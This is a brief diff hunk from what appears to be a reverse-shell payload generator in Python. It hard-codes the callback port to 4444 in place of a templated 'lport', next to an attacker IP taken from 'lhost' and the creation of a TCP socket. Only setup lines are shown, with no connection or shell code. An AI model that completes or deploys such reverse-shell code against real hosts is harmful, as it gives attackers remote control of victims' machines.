@@ -187,7 +187,7 @@ while True:
 		import sys
 
 		IP = f'{lhost}'
-		PORT = {lport}
+		PORT = 4444
 
 		s = socket.socket(socket.AF_INET,
 			socket.SOCK_STREAM)
